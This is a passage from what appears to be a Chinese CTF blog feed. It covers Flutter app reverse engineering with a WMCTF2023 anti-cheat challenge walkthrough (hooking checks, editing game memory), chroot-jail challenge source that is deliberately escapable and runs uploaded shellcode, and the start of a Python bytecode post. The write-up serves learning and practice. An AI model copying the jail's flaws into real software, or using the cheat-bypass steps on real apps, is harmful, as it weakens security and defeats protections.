--target=tilegx-linux-gnu"></a><code>../configure --target=tilegx-linux-gnu</code></h5><h5 id="make-1"><a href="#make-1" class="headerlink" title="make"></a><code>make</code></h5><h5 id="tilegx-linux-gnu-objdump-d-Desktop-newFolder-chall-gt-output-asm"><a href="#tilegx-linux-gnu-objdump-d-Desktop-newFolder-chall-gt-output-asm" class="headerlink" title="tilegx-linux-gnu-objdump -d ~/Desktop/newFolder/chall &gt; output.asm"></a><code>tilegx-linux-gnu-objdump -d ~/Desktop/newFolder/chall &gt; output.asm</code></h5><h5 id="即可获得文件的汇编"><a href="#即可获得文件的汇编" class="headerlink" title="即可获得文件的汇编"></a>即可获得文件的汇编</h5>]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>初探flutter</title>
    <url>/2023/08/23/%E5%88%9D%E6%8E%A2flutter/</url>
    <content><![CDATA[<h6 id="preface-起因是WMCTF2023有个anticheat2是基于flutter开发的，中间也得用到相关知识。题目是一下子被队里师傅秒了（555队里师傅秒题太快哩毫无存在感属于是）但是总归还是得来补补功课，啥也不学还是啥也不会。（虽然这会我的安卓环境还是不太彳亍容错很低当时比赛的时候就没有环境跑这个题）"><a href="#preface-起因是WMCTF2023有个anticheat2是基于flutter开发的，中间也得用到相关知识。题目是一下子被队里师傅秒了（555队里师傅秒题太快哩毫无存在感属于是）但是总归还是得来补补功课，啥也不学还是啥也不会。（虽然这会我的安卓环境还是不太彳亍容错很低当时比赛的时候就没有环境跑这个题）" class="headerlink" title="preface: 起因是WMCTF2023有个anticheat2是基于flutter开发的，中间也得用到相关知识。题目是一下子被队里师傅秒了（555队里师傅秒题太快哩毫无存在感属于是）但是总归还是得来补补功课，啥也不学还是啥也不会。（虽然这会我的安卓环境还是不太彳亍容错很低当时比赛的时候就没有环境跑这个题）"></a>preface: 起因是WMCTF2023有个anticheat2是基于flutter开发的，中间也得用到相关知识。题目是一下子被队里师傅秒了（<del>555队里师傅秒题太快哩毫无存在感属于是</del>）但是总归还是得来补补功课，啥也不学还是啥也不会。（<del>虽然这会我的安卓环境还是不太彳亍容错很低当时比赛的时候就没有环境跑这个题</del>）</h6><span id="more"></span>

<h5 id="文档：Flutter-架构概览-Flutter-中文文档-Flutter-中文开发者网站-Flutter"><a href="#文档：Flutter-架构概览-Flutter-中文文档-Flutter-中文开发者网站-Flutter" class="headerlink" title="文档：Flutter 架构概览 - Flutter 中文文档 - Flutter 中文开发者网站 - Flutter"></a>文档：<a href="https://flutter.cn/docs/resources/architectural-overview">Flutter 架构概览 - Flutter 中文文档 - Flutter 中文开发者网站 - Flutter</a></h5><h5 id="参考文章：Reverse-engineering-Flutter-apps-Part-1-tst-sh"><a href="#参考文章：Reverse-engineering-Flutter-apps-Part-1-tst-sh" class="headerlink" title="参考文章：Reverse engineering Flutter apps (Part 1) (tst.sh)"></a>参考文章：<a href="https://blog.tst.sh/reverse-engineering-flutter-apps-part-1/">Reverse engineering Flutter apps (Part 1) (tst.sh)</a></h5><h5 id="Reverse-engineering-Flutter-apps-Part-2-tst-sh"><a href="#Reverse-engineering-Flutter-apps-Part-2-tst-sh" class="headerlink" title="Reverse engineering Flutter apps (Part 2) (tst.sh)"></a><a href="https://blog.tst.sh/reverse-engineering-flutter-apps-part-2/">Reverse engineering Flutter apps (Part 2) (tst.sh)</a></h5><h5 id="TODO：工具"><a href="#TODO：工具" class="headerlink" title="TODO：工具"></a>TODO：<a href="https://bbs.kanxue.com/thread-275287.htm">工具</a></h5><h5 id="flutter逆向初探–-2023国赛ctf的flutterror-1mmorta1的博客-CSDN博客"><a href="#flutter逆向初探–-2023国赛ctf的flutterror-1mmorta1的博客-CSDN博客" class="headerlink" title="flutter逆向初探– 2023国赛ctf的flutterror_1mmorta1的博客-CSDN博客"></a><a href="https://blog.csdn.net/qq_41866334/article/details/131032273">flutter逆向初探– 2023国赛ctf的flutterror_1mmorta1的博客-CSDN博客</a></h5><h5 id="Reverse-Engineering-Flutter-Apps-Guardsquare"><a href="#Reverse-Engineering-Flutter-Apps-Guardsquare" class="headerlink" title="Reverse Engineering Flutter Apps | Guardsquare"></a><a href="https://www.guardsquare.com/blog/current-state-and-future-of-reversing-flutter-apps">Reverse Engineering Flutter Apps | Guardsquare</a></h5><h5 id="Flutter架构：分层系统，上层组件依赖下层组件，组件层间不可越权且各个部分可选可替代（类似层与层间透明）"><a href="#Flutter架构：分层系统，上层组件依赖下层组件，组件层间不可越权且各个部分可选可替代（类似层与层间透明）" class="headerlink" title="Flutter架构：分层系统，上层组件依赖下层组件，组件层间不可越权且各个部分可选可替代（类似层与层间透明）"></a>Flutter架构：分层系统，上层组件依赖下层组件，组件层间不可越权且各个部分可选可替代（类似层与层间透明）</h5><h5 id><a href="#" class="headerlink" title></a><img src="/2023/08/23/%E5%88%9D%E6%8E%A2flutter/archdiagram.webp" alt="archdiagram"></h5><h6 id="对于底层操作系统而言，Flutter-应用程序的包装方式与其他原生应用相同。在每一个平台上，会包含一个特定的嵌入层，从而提供一个程序入口，程序由此可以与底层操作系统进行协调，访问诸如-surface-渲染、辅助功能和输入等服务，并且管理事件循环队列。该嵌入层采用了适合当前平台的语言编写，例如-Android-使用的是-Java-和-C-，-iOS-和-macOS-使用的是-Objective-C-和-Objective-C-，Windows-和-Linux-使用的是-C-。-Flutter-代码可以通过嵌入层，以模块方式集成到现有的应用中，也可以作为应用的主体。-Flutter-本身包含了各个常见平台的嵌入层，同时也-存在一些其他的嵌入层。"><a href="#对于底层操作系统而言，Flutter-应用程序的包装方式与其他原生应用相同。在每一个平台上，会包含一个特定的嵌入层，从而提供一个程序入口，程序由此可以与底层操作系统进行协调，访问诸如-surface-渲染、辅助功能和输入等服务，并且管理事件循环队列。该嵌入层采用了适合当前平台的语言编写，例如-Android-使用的是-Java-和-C-，-iOS-和-macOS-使用的是-Objective-C-和-Objective-C-，Windows-和-Linux-使用的是-C-。-Flutter-代码可以通过嵌入层，以模块方式集成到现有的应用中，也可以作为应用的主体。-Flutter-本身包含了各个常见平台的嵌入层，同时也-存在一些其他的嵌入层。" class="headerlink" title="对于底层操作系统而言，Flutter 应用程序的包装方式与其他原生应用相同。在每一个平台上，会包含一个特定的嵌入层，从而提供一个程序入口，程序由此可以与底层操作系统进行协调，访问诸如 surface 渲染、辅助功能和输入等服务，并且管理事件循环队列。该嵌入层采用了适合当前平台的语言编写，例如 Android 使用的是 Java 和 C++， iOS 和 macOS 使用的是 Objective-C 和 Objective-C++，Windows 和 Linux 使用的是 C++。 Flutter 代码可以通过嵌入层，以模块方式集成到现有的应用中，也可以作为应用的主体。 Flutter 本身包含了各个常见平台的嵌入层，同时也 存在一些其他的嵌入层。"></a>对于底层操作系统而言，Flutter 应用程序的包装方式与其他原生应用相同。在每一个平台上，会包含一个特定的嵌入层，从而提供一个程序入口，程序由此可以与底层操作系统进行协调，访问诸如 surface 渲染、辅助功能和输入等服务，并且管理事件循环队列。该嵌入层采用了适合当前平台的语言编写，例如 Android 使用的是 Java 和 C++， iOS 和 macOS 使用的是 Objective-C 和 Objective-C++，Windows 和 Linux 使用的是 C++。 Flutter 代码可以通过嵌入层，以模块方式集成到现有的应用中，也可以作为应用的主体。 Flutter 本身包含了各个常见平台的嵌入层，同时也 <a href="https://hover.build/blog/one-year-in/">存在一些其他的嵌入层</a>。</h6><h6 id="Flutter-引擎-毫无疑问是-Flutter-的核心，它主要使用-C-编写，并提供了-Flutter-应用所需的原语。当需要绘制新一帧的内容时，引擎将负责对需要合成的场景进行栅格化。它提供了-Flutter-核心-API-的底层实现，包括图形（在-iOS-和-Android-上通过-Impeller，在其他平台上通过-Skia）、文本布局、文件及网络-IO、辅助功能支持、插件架构和-Dart-运行环境及编译环境的工具链。"><a href="#Flutter-引擎-毫无疑问是-Flutter-的核心，它主要使用-C-编写，并提供了-Flutter-应用所需的原语。当需要绘制新一帧的内容时，引擎将负责对需要合成的场景进行栅格化。它提供了-Flutter-核心-API-的底层实现，包括图形（在-iOS-和-Android-上通过-Impeller，在其他平台上通过-Skia）、文本布局、文件及网络-IO、辅助功能支持、插件架构和-Dart-运行环境及编译环境的工具链。" class="headerlink" title="Flutter 引擎 毫无疑问是 Flutter 的核心，它主要使用 C++ 编写，并提供了 Flutter 应用所需的原语。当需要绘制新一帧的内容时，引擎将负责对需要合成的场景进行栅格化。它提供了 Flutter 核心 API 的底层实现，包括图形（在 iOS 和 Android 上通过 Impeller，在其他平台上通过 Skia）、文本布局、文件及网络 IO、辅助功能支持、插件架构和 Dart 运行环境及编译环境的工具链。"></a><strong>Flutter 引擎</strong> 毫无疑问是 Flutter 的核心，它主要使用 C++ 编写，并提供了 Flutter 应用所需的原语。当需要绘制新一帧的内容时，引擎将负责对需要合成的场景进行栅格化。它提供了 Flutter 核心 API 的底层实现，包括图形（在 iOS 和 Android 上通过 <a href="https://flutter.cn/docs/perf/impeller">Impeller</a>，在其他平台上通过 <a href="https://skia.org/">Skia</a>）、文本布局、文件及网络 IO、辅助功能支持、插件架构和 Dart 运行环境及编译环境的工具链。</h6><h6 id="引擎将底层-C-代码包装成-Dart-代码，通过-dart-ui-暴露给-Flutter-框架层。该库暴露了最底层的原语，包括用于驱动输入、图形、和文本渲染的子系统的类。"><a href="#引擎将底层-C-代码包装成-Dart-代码，通过-dart-ui-暴露给-Flutter-框架层。该库暴露了最底层的原语，包括用于驱动输入、图形、和文本渲染的子系统的类。" class="headerlink" title="引擎将底层 C++ 代码包装成 Dart 代码，通过 dart:ui 暴露给 Flutter 框架层。该库暴露了最底层的原语，包括用于驱动输入、图形、和文本渲染的子系统的类。"></a><strong>引擎将底层 C++ 代码包装成 Dart 代码，通过 <a href="https://github.com/flutter/engine/tree/master/lib/ui"><code>dart:ui</code></a> 暴露给 Flutter 框架层。该库暴露了最底层的原语，包括用于驱动输入、图形、和文本渲染的子系统的类。</strong></h6><h5 id="应用结构："><a href="#应用结构：" class="headerlink" title="应用结构："></a>应用结构：<img src="/2023/08/23/%E5%88%9D%E6%8E%A2flutter/app-anatomy.svg" alt="app-anatomy"></h5><h5 id="flutter构建的文件结构："><a href="#flutter构建的文件结构：" class="headerlink" title="flutter构建的文件结构："></a>flutter构建的文件结构：</h5><pre><code class="text">tree .
.
├── arm64-v8a
│   ├── libapp.so
│   └── libflutter.so
└── armeabi-v7a
    ├── libapp.so
    └── libflutter.so
</code></pre>
<p>Android apk包中两个libapp.so文件，它们分别是作为 ELF 二进制文件的 a64 和 a32 快照。gen_snapshots在此处输出ELF&#x2F;共享对象可能会引起误解，它不会将 dart 方法公开为可以在外部调用的符号。相反，这些文件是“cluster 化快照”格式的容器，但在单独的可执行部分中包含编译的代码，以下是它们的结构：</p>
<pre><code class="text">$ aarch64-linux-gnu-objdump -T libapp.so

libapp.so:     file format elf64-littleaarch64

DYNAMIC SYMBOL TABLE:
0000000000001000 g    DF .text  0000000000004ba0 _kDartVmSnapshotInstructions
0000000000006000 g    DF .text  00000000002d0de0 _kDartIsolateSnapshotInstructions
00000000002d7000 g    DO .rodata        0000000000007f10 _kDartVmSnapshotData
00000000002df000 g    DO .rodata        000000000021ad10 _kDartIsolateSnapshotData
</code></pre>
<h5 id="Dart-构建"><a href="#Dart-构建" class="headerlink" title="Dart 构建"></a><a href="https://github.com/dart-lang/sdk/wiki/Building">Dart 构建</a></h5><h5 id="Dart混淆"><a href="#Dart混淆" class="headerlink" title="Dart混淆"></a><a href="https://github.com/flutter/flutter/wiki/Obfuscating-Dart-Code">Dart混淆</a></h5><h5 id="dart-64的寄存器和函数调用约定："><a href="#dart-64的寄存器和函数调用约定：" class="headerlink" title="dart 64的寄存器和函数调用约定："></a>dart 64的寄存器和函数调用约定：</h5><pre><code>       r0 |     | Returns
r0  -  r7 |     | Arguments
r0  - r14 |     | General purpose
      r15 | sp  | Dart stack pointer
      r16 | ip0 | Scratch register
      r17 | ip1 | Scratch register
      r18 |     | Platform register
r19 - r25 |     | General purpose
r19 - r28 |     | Callee saved registers
      r26 | thr | Current thread
      r27 | pp  | Object pool
      r28 | brm | Barrier mask
      r29 | fp  | Frame pointer
      r30 | lr  | Link register
      r31 | zr  | Zero / CSP
</code></pre>
<h5 id="dart-32的寄存器和函数调用约定："><a href="#dart-32的寄存器和函数调用约定：" class="headerlink" title="dart 32的寄存器和函数调用约定："></a>dart 32的寄存器和函数调用约定：</h5><pre><code>r0 -  r1 |     | Returns
r0 -  r9 |     | General purpose
r4 - r10 |     | Callee saved registers
      r5 | pp  | Object pool
     r10 | thr | Current thread
     r11 | fp  | Frame pointer
     r12 | ip  | Scratch register
     r13 | sp  | Stack pointer
     r14 | lr  | Link register
     r15 | pc  | Program counter
</code></pre>
<h5 id="example："><a href="#example：" class="headerlink" title="example："></a>example：</h5><pre><code class="dart">void hello() &#123;
  print(&quot;Hello, World!&quot;);
&#125;
</code></pre>
<pre><code class="asm">Code for optimized function &#39;package:dectest/hello_world.dart_::_hello&#39; &#123;
        ;; B0
        ;; B1
        ;; Enter frame（保存当前函数帧指针和返回地址）
0xf69ace60    e92d4800               stmdb sp!, &#123;fp, lr&#125;;stmdb sp!存储数据前递减寄存器(Store Multiple Decrement Before)
0xf69ace64    e28db000               add fp, sp, #0
        ;; CheckStackOverflow:8(stack=0, loop=0)将字段偏移表（限制个数为36）加载到ip中并检测栈溢出
0xf69ace68    e59ac024               ldr ip, [thr, #+36]
0xf69ace6c    e15d000c               cmp sp, ip
0xf69ace70    9bfffffe               blls +0 ; 0xf69ace70
        ;; PushArgument(v3)
0xf69ace74    e285ca01               add ip, pp, #4096
0xf69ace78    e59ccfa7               ldr ip, [ip, #+4007]
0xf69ace7c    e52dc004               str ip, [sp, #-4]!
        ;; StaticCall:12( print&lt;0&gt; v3)
0xf69ace80    ebfffffe               bl +0 ; 0xf69ace80
0xf69ace84    e28dd004               add sp, sp, #4
        ;; ParallelMove r0 &lt;- C
0xf69ace88    e59a0060               ldr r0, [thr, #+96]
        ;; Return:16(v0)
0xf69ace8c    e24bd000               sub sp, fp, #0
0xf69ace90    e8bd8800               ldmia sp!, &#123;fp, pc&#125;
0xf69ace94    e1200070               bkpt #0x0
&#125;
</code></pre>
<h5 id="another-example"><a href="#another-example" class="headerlink" title="another example:"></a>another example:</h5><pre><code class="asm">// prologue, polymorphic entry
000 | stmdb sp!, &#123;fp, lr&#125;
004 | add fp, sp, #0
008 | sub sp, sp, #4
// optional parameter handling
00c | ldr r0, [r4, #0x13] // arr[2] (positional arg count)
010 | ldr r1, [r4, #0xf]  // arr[1] (argument count)
014 | cmp r0, #0          // check if we have positional args
018 | bgt 0x74            // jump to 08c
// check named args
01c | ldr r0, [r4, #0x17]  // arr[3] (first arg name)
020 | add ip, pp, #0x2000  // 
024 | ldr ip, [ip, #0x4a7] // string &quot;x&quot;
028 | cmp r0, ip           // check if arg present
02c | bne 0x20             // jump to 04c
030 | ldr r0, [r4, #0x1b]    // arr[4] (first arg position)
034 | sub r2, r1, r0         // r2 = arg_count - position
038 | add r0, fp, r2, lsl #1 // r0 = fp + r2 * 2
    |                        // this is really r2 * 4 because it&#39;s an smi
03c | ldr r0, [r0, #4]       // read arg
040 | mov r2, r0             // 
044 | mov r0, #2             // 
048 | b 12                   // jump to 054
04c | ldr r2, [thr, #0x68] // thr-&gt;objectNull
050 | mov r0, #0           // 
054 | str r2, [fp, #-4] // store arg in local
// done loading args
058 | cmp r1, r0 // check if we have read all args
05c | bne 0x30   // jump to 08c
// continue prologe
060 | ldr ip, [thr, #0x24] // thr-&gt;stackLimit
064 | cmp sp, ip           //
068 | blls -0x5af00        // stackOverflowStubWithoutFpuRegsStub
// rest of function
06c | ...
// incompatible args path
08c | ldr r6, [pp, #0x33] // Code* callClosureNoSuchMethod
090 | sub sp, fp, #0      // 
094 | ldmia sp!, &#123;fp, lr&#125; // exit frame
098 | ldr pc, [r6, #3]    // invoke stub
</code></pre>
<p>一些普遍做题思路：先reflutter然后对着dump出来的offset进行hook&#x2F;恢复符号表</p>
<p><del>大概流程懂了，等个环境先</del></p>
<p>ARM交叉编译工具链(32位)：<code>sudo apt-get install gcc-arm-linux-gnueabi binutils-arm-linux-gnueabi</code> (64位)：<code>sudo apt-get install gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu</code></p>
<p>寻找<code>SVC</code>指令出现的地址：<code>aarch64-linux-gnu-objdump -D libapp.so | grep -B2 -A2 --color=always &quot;svc&quot;</code></p>
<hr>
<h6 id="leaves大哥带着在看这个babyanti2，比赛的时候被他高速非预期了，但是现在复盘感觉预期解难度有点离谱的"><a href="#leaves大哥带着在看这个babyanti2，比赛的时候被他高速非预期了，但是现在复盘感觉预期解难度有点离谱的" class="headerlink" title="leaves大哥带着在看这个babyanti2，比赛的时候被他高速非预期了，但是现在复盘感觉预期解难度有点离谱的"></a>leaves大哥带着在看这个babyanti2，比赛的时候被他高速非预期了，但是现在复盘感觉预期解难度有点离谱的</h6><h5 id="目前还没有完整复现，但是大概记录一下："><a href="#目前还没有完整复现，但是大概记录一下：" class="headerlink" title="目前还没有完整复现，但是大概记录一下："></a>目前还没有完整复现，但是大概记录一下：</h5><ul>
<li><p>最简单的先把anti里面的环境检测hook掉</p>
</li>
<li><p>然后合理就去gg修改分数，但是发现有疑似内存检查</p>
</li>
<li><p>flutter的libapp.so恢复符号表（基本上就是我上面说的方法）发现有对内存进行的操作，进行hook</p>
</li>
<li><p>然后不够，libapp.so里面有一个<code>generateShellcodes</code>，非常复杂；可以hook <code>mprotect</code>，发现有一个传入0x7（可读、写、执行）的调用，比较异常，对其操作的0x1000长度的地址dump下来分析，发现好几十个SVC调用</p>
</li>
<li><p>后续： 结论是两层shellcode 调用 mincore，检查是否有内存缺页更改的操作，确实难</p>
</li>
</ul>
<hr>
<h6 id="9-14-BabyAnti2完整复现："><a href="#9-14-BabyAnti2完整复现：" class="headerlink" title="9.14: BabyAnti2完整复现："></a>9.14: BabyAnti2完整复现：</h6><p>AntiCheatPlugin的Java层几乎看不到东西，只能判断使用flutter，那么必须继续看下去，找dart层和native层的逻辑</p>
<p><img src="/2023/08/23/%E5%88%9D%E6%8E%A2flutter/image-20230914083329468.png" alt="image-20230914083329468"></p>
<p>直接看native：</p>
<p><img src="/2023/08/23/%E5%88%9D%E6%8E%A2flutter/image-20230914083721077.png" alt="image-20230914083721077"></p>
<p><code>libflutter.so</code>：flutter预编译的组件库（不会因为开发者的Dart而改变），flutter引擎的主要组成部分，包含了flutter运行所需要的核心代码，负责渲染Flutter widgets、处理事件、与Dart VM进行交互以及其他核心功能</p>
<p><code>libapp.so</code>：Dart代码编译后的产物，包含所有Dart层的native逻辑、UI、Flutter plugins，当应用启动时，<code>libflutter.so</code>会加载<code>libapp.so</code>并开始执行Dart代码</p>
<p><code>libanticheat.so（其他）</code>：通过Android NDK编写的native代码编译产物</p>
<p>尝试通过<a href="https://github.com/rscloura/Doldrums">rscloura&#x2F;Doldrums: A Flutter&#x2F;Dart reverse engineering tool (github.com)</a>工具提取libapp.so，失败，DartSDK版本对不上</p>
<p><img src="/2023/08/23/%E5%88%9D%E6%8E%A2flutter/image-20230914094329393.png" alt="image-20230914094329393"></p>
<p>寻找版本相关信息，可以得到这段，获取版本号3.1.0（这里可以猜测这个是dart的版本）对应到<a href="https://docs.flutter.dev/release/archive?tab=windows">Flutter SDK archive | Flutter</a>可以查找flutter的版本号beta版本的3.13.0-0.4.pre（根据发布时间和Dart version，不过hash号没有找到，还得看看）</p>
<p><img src="/2023/08/23/%E5%88%9D%E6%8E%A2flutter/image-20230914103350070.png" alt="image-20230914103350070"></p>
<p>题目出的时候<code>reflutter</code>还没有更新到这个版本，可以认为，在比赛环境下这让做这道题的预期解难度陡然升高</p>
<p>那也只能开始漫长学习，先看看这篇的原理：<a href="https://swarm.ptsecurity.com/fork-bomb-for-flutter/">Fork Bomb for Flutter – PT SWARM (ptsecurity.com)</a></p>
<p>安装应用：<code>adb push .apk /data/local/tmp </code></p>
<p><code>pm install -r .apk</code></p>
<p>签名工具：<a href="https://github.com/patrickfav/uber-apk-signer/releases/tag/v1.2.1">Release v1.2.1 · patrickfav&#x2F;uber-apk-signer (github.com)</a></p>
<p><code>java -jar uber-apk-signer.jar --allowResign -**a** release.RE.apk</code></p>
<p><code> adb logcat -e reflutter | ForEach-Object &#123; $_ -replace &#39;.*DartVM&#39;, &#39;&#39; &#125; &gt;&gt; reflutter.txt</code></p>
]]></content>
  </entry>
  <entry>
    <title>sandbox</title>
    <url>/2024/04/04/sandbox/</url>
    <content><![CDATA[<h6 id="PREFACE"><a href="#PREFACE" class="headerlink" title="PREFACE:"></a>PREFACE:</h6><span id="more"></span>

<p>审洞，chroot以后没有chdir，会保留当前文件夹下的状态信息，可以直接到需要的目录下运行读取，sendfile可以跨chroot把东西读出来</p>
<pre><code class="cpp">#define _GNU_SOURCE 1

#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdbool.h&gt;
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include &lt;time.h&gt;
#include &lt;errno.h&gt;
#include &lt;assert.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/sendfile.h&gt;

int main(int argc, char **argv, char **envp)
&#123;
    assert(argc &gt; 0);

    printf(&quot;###\n&quot;);
    printf(&quot;### Welcome to %s!\n&quot;, argv[0]);
    printf(&quot;###\n&quot;);
    printf(&quot;\n&quot;);

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts(&quot;This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this&quot;);
    puts(&quot;jail, not the real flag file outside of it. If you want the real flag, you must escape.\n&quot;);
    puts(&quot;The only thing you can do in this challenge is read out one single file, as specified by the first argument to the&quot;);
    puts(&quot;program (argv[1]).\n&quot;);

    assert(argc &gt; 1);

    char jail_path[] = &quot;/tmp/jail-XXXXXX&quot;;
    assert(mkdtemp(jail_path) != NULL);

    printf(&quot;Creating a jail at `%s`.\n&quot;, jail_path);

    assert(chroot(jail_path) == 0);

    int fffd = open(&quot;/flag&quot;, O_WRONLY | O_CREAT);
    write(fffd, &quot;FLAG&#123;FAKE&#125;&quot;, 10);
    close(fffd);

    printf(&quot;Sending the file at `%s` to stdout.\n&quot;, argv[1]);
    sendfile(1, open(argv[1], 0), 0, 128);

&#125;
</code></pre>
<p>level2</p>
<pre><code class="cpp">#define _GNU_SOURCE 1

#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdbool.h&gt;
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include &lt;time.h&gt;
#include &lt;errno.h&gt;
#include &lt;assert.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/sendfile.h&gt;

#include &lt;capstone/capstone.h&gt;

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
&#123;
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &amp;handle) != CS_ERR_OK)
    &#123;
        printf(&quot;ERROR: disassembler failed to initialize.\n&quot;);
        return;
    &#125;

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &amp;insn);
    if (count &gt; 0)
    &#123;
        size_t j;
        printf(&quot;      Address      |                      Bytes                    |          Instructions\n&quot;);
        printf(&quot;------------------------------------------------------------------------------------------\n&quot;);

        for (j = 0; j &lt; count; j++)
        &#123;
            printf(&quot;0x%016lx | &quot;, (unsigned long)insn[j].address);
            for (int k = 0; k &lt; insn[j].size; k++) printf(&quot;%02hhx &quot;, insn[j].bytes[k]);
            for (int k = insn[j].size; k &lt; 15; k++) printf(&quot;   &quot;);
            printf(&quot; | %s %s\n&quot;, insn[j].mnemonic, insn[j].op_str);
        &#125;

        cs_free(insn, count);
    &#125;
    else
    &#123;
        printf(&quot;ERROR: Failed to disassemble shellcode! Bytes are:\n\n&quot;);
        printf(&quot;      Address      |                      Bytes\n&quot;);
        printf(&quot;--------------------------------------------------------------------\n&quot;);
        for (unsigned int i = 0; i &lt;= shellcode_size; i += 16)
        &#123;
            printf(&quot;0x%016lx | &quot;, (unsigned long)shellcode_addr+i);
            for (int k = 0; k &lt; 16; k++) printf(&quot;%02hhx &quot;, ((uint8_t*)shellcode_addr)[i+k]);
            printf(&quot;\n&quot;);
        &#125;
    &#125;

    cs_close(&amp;handle);
&#125;

int main(int argc, char **argv, char **envp)
&#123;
    assert(argc &gt; 0);

    printf(&quot;###\n&quot;);
    printf(&quot;### Welcome to %s!\n&quot;, argv[0]);
    printf(&quot;###\n&quot;);
    printf(&quot;\n&quot;);

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts(&quot;This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this&quot;);
    puts(&quot;jail, not the real flag file outside of it. If you want the real flag, you must escape.\n&quot;);

    puts(&quot;You may open a specified file, as given by the first argument to the program (argv[1]).\n&quot;);

    puts(&quot;You may upload custom shellcode to do whatever you want.\n&quot;);

    assert(argc &gt; 1);

    puts(&quot;Checking to make sure you&#39;re not trying to open the flag.\n&quot;);
    assert(strstr(argv[1], &quot;flag&quot;) == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd &lt; 0)
        printf(&quot;Failed to open the file located at `%s`.\n&quot;, argv[1]);
    else
        printf(&quot;Successfully opened the file located at `%s`.\n&quot;, argv[1]);

    char jail_path[] = &quot;/tmp/jail-XXXXXX&quot;;
    assert(mkdtemp(jail_path) != NULL);

    printf(&quot;Creating a jail at `%s`.\n&quot;, jail_path);

    assert(chroot(jail_path) == 0);

    int fffd = open(&quot;/flag&quot;, O_WRONLY | O_CREAT);
    write(fffd, &quot;FLAG&#123;FAKE&#125;&quot;, 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf(&quot;Mapped 0x1000 bytes for shellcode at %p!\n&quot;, shellcode);

    puts(&quot;Reading 0x1000 bytes of shellcode from stdin.\n&quot;);
    int shellcode_size = read(0, shellcode, 0x1000);

    puts(&quot;This challenge is about to execute the following shellcode:\n&quot;);
    print_disassembly(shellcode, shellcode_size);
    puts(&quot;&quot;);

    puts(&quot;Executing shellcode!\n&quot;);

    ((void(*)())shellcode)();
&#125;
</code></pre>
<blockquote>
<p>.&#x2F;flag</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>初探python bytecode</title>
    <url>/2023/08/23/%E5%88%9D%E6%8E%A2python-bytecode/</url>
    <content><![CDATA[<h6 id="preface-起因是wmctf的一道python题，包括了修复python字节码花指令和虚拟机等考点。算是萌新初见python花，花了一上午学习修了花指令，反编译不了不过可以获得字节码，理论上手动反汇编得到python码就没问题了。但实际上这里的字节码结构也有点问题，顺便从学长那里听闻了一下下antlr这种东西。然后手动翻译的伪代码也错漏百出…最后是学长写了脚本给他自动化修了得以告一段落。不过确实得回来补补python的编译结构功课了。"><a href="#preface-起因是wmctf的一道python题，包括了修复python字节码花指令和虚拟机等考点。算是萌新初见python花，花了一上午学习修了花指令，反编译不了不过可以获得字节码，理论上手动反汇编得到python码就没问题了。但实际上这里的字节码结构也有点问题，顺便从学长那里听闻了一下下antlr这种东西。然后手动翻译的伪代码也错漏百出…最后是学长写了脚本给他自动化修了得以告一段落。不过确实得回来补补python的编译结构功课了。" class="headerlink" title="preface:起因是wmctf的一道python题，包括了修复python字节码花指令和虚拟机等考点。算是萌新初见python花，花了一上午学习修了花指令，反编译不了不过可以获得字节码，理论上手动反汇编得到python码就没问题了。但实际上这里的字节码结构也有点问题，顺便从学长那里听闻了一下下antlr这种东西。然后手动翻译的伪代码也错漏百出…最后是学长写了脚本给他自动化修了得以告一段落。不过确实得回来补补python的编译结构功课了。"></a>preface:起因是wmctf的一道python题，包括了修复python字节码花指令和虚拟机等考点。算是萌新初见python花，花了一上午学习修了花指令，反编译不了不过可以获得字节码，理论上手动反汇编得到python码就没问题了。但实际上这里的字节码结构也有点问题，顺便从学长那里听闻了一下下antlr这种东西。然后手动翻译的伪代码也错漏百出…最后是学长写了脚本给他自动化修了得以告一段落。不过确实得回来补补python的编译结构功课了。</h6><span id="more"></span>

